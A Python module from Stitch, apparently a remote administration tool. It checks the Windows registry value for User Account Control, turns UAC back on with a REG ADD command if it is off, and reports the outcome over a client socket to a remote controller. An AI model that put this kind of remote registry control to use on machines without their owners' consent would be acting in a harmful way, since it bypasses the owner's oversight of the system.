# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import sys
import _winreg
import subprocess

def enable_uac():
    return run_command("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f")

def check_uac():
    uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
    val=_winreg.QueryValueEx(uac_key, "EnableLUA")
    if val[0] == 1:
        return True
    else:
        return False

if not check_uac():
    enable_uac()
    if check_uac():
        send(client_socket, "[+] UAC is now Enabled\n")
    else:
        send(client_socket, "[!] Failed to enable UAC, UAC is still Disabled\n")
else:
    send(client_socket, "[*] UAC is already Enabled\n")
